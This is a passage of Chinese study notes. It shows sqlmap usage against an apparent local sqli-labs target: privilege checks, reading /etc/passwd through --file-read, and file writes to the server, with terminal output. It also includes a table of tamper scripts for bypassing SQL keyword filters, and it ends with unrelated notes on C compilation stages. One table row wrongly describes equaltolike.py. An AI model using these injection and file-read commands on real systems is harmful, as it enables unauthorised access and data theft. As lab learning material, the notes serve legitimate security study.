...
参数`--level 5`指需要执行的测试等级，一共有5个等级（1~5级），可不加`leval`，默认是1级。可以在`/xml/payloads.xml`中看到SQLMap使用的Payload，也可以根据响应的格式添加自己的Payload。其中5级包含的Payload最多，会自动破解Cookie、XFF等头部注入。当然，5级的允许速度也比较慢

这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP Cookie在等级为2时会进行测试，HTTP User-Agent/Referer头在等级为3时进行测试。总之，在不确定哪个Payload或参数为注入点时，为了保证全名性，建议使用搞的等级值

###### （9）--is-dba：当前用户是否有管理权限

```shell
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.153:8088/Less-1/?id=1" --is-dba
[08:29:52] [INFO] fetching current user
current user is DBA: True								# True 表示当前用户拥有管理权限
[08:29:52] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.231.153'
[08:29:52] [WARNING] your sqlmap version is outdated
```

###### （10）--file-read：从数据库服务器中读取执行文件

```shell
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.153:8088/Less-1/?id=1" --file-read "/etc/passwd"
[08:32:29] [INFO] fetching file: '/etc/passwd'
...
[08:32:31] [INFO] the local file '/root/.local/share/sqlmap/output/192.168.231.153/files/_etc_passwd' and the remote file '/etc/passwd' have the same size (1012 B)
files saved to [1]:
# 文件保存路径
[*] /root/.local/share/sqlmap/output/192.168.231.153/files/_etc_passwd (same file)
```

###### （11）--file-write和--file-dest：将本地文件写入数据库服务器

```php
# --file-write 要写入的本地文件路径
# --file-dest 要写入的目标服务器路径
┌──(root㉿kali)-[/home/kali]
└─# sqlmap -u "http://192.168.231.153:8088/Less-1/?id=1" --file-write "./nohup.out" --file-dest "/tmp/1.txt"
 DBMS file system ('/tmp/1.txt')? [Y/n] 
[08:35:52] [INFO] retrieved: ' '
[08:35:52] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
[08:35:52] [WARNING] HTTP error codes detected during run:
414 (Request-URI Too Long) - 2 times
[08:35:52] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.231.153'
[08:35:52] [WARNING] your sqlmap version is outdated
```
...
| **space2plus.py**              | 用加号替换空格                                               |
| **nonrecursivereplacement.py** | 用双重替换掉原来的关键字，绕过简单的关键字过滤，例如seleselectct |
| **space2comment.py**           | 将空格替换为/**/的内联注释                                   |
| **space2mysqlblank.py**        | 将空格替换为('%09', '%0A', '%0C', '%0D', '%0B')              |
| **equaltolike.py**             | 将>替换为GREATEST，绕过对>的过滤                             |
| ifnull2ifisnull.py             | 将 ifnull() 函数转为 if(isnull()) 函数，用于过滤了 ifnull 函数的情况 |
| informationschemacomment.py    | 在 information_schema 后面加上 /**/ ，用于绕过对 information_schema 的情况 |
...
使用Burp Suite将HTTP请求报文复制到文件中

<img src="%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240422201559299.png" alt="image-20240422201559299" style="zoom:67%;" />

使用`-r`参数判断是否存在注入

![image-20240422201655480](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240422201655480.png)
...
hello 程序的生命周期是从一个高级C语言程序开始的，因为这种形式能够被人读懂。然而，为了在系统上允许`hello.c`程序，每条C语句都必须被其他程序转化为一系列的低级机器语言指令，然后这些指令按照一种可执行目标程序的格式打好包，并以二进制磁盘文件的形式存储起来。目标程序也成为可执行目标文件
...
在这里，GCC编译器驱动程序读取源程序文件`hello.c`，并把它翻译成一个可执行目标文件 hello，这个翻译过程可分为四个阶段完成：

1. 预处理阶段：预处理器（cpp）根据以字符#开头的命令，修改原始的C程序。比如`hello.c`中的第一行的`#include <stdio.h>`命令告诉预处理器读取系统头部文件`stdio.h`的内容，并把它直接插入程序文本中，结果就得到了一个另一个C程序，通常是以`.i`作文文件扩展名

2. 编译阶段：编译器（ccl）将文本文件`hello.i`翻译成文本文件`hello.s`，它包含一个汇编语言程序。该程序包含函数`main`的定义，如下所示：
   ...
   定义中2~7行的每条语句都以一种文本格式描述了一条低级及其语言指令。汇编语言是非常有用的，因为它为不同高级语言的不同编译器提供了通用的输出语言。例如，C编译器和Fortran编译器产生的输出文件用的都是一样的汇编语言

3. 汇编阶段。接下来，汇编器（as）将`hello.s`翻译成机器语言指令，把这些指令打包成一种叫做可重定向位目标程序（relocatable object program）的格式，并将结果保存在目标文件`hello.o`中。`hello.o`文件是一个二进制文件，它包含的17个字节是函数`main`的指令编码。如果我们在文本编辑器中打开`hello.o`文件，将看到一堆乱码

4. 链接阶段：hello程序调用了`printf`函数，它是每个C编译器都提供的标准C库中的一个函数。`printf`函数存在于一个名为`printf.o`的单独的预编译好了的目标文件中，而这个文件必须以某种方式合并到我们的`hello.o`程序中。链接器（ld）就负责处理这种合并。结果就得到hello文件，它是一个可执行目标文件（或者简称为可执行文件），可以被加载到内存中，由系统运行
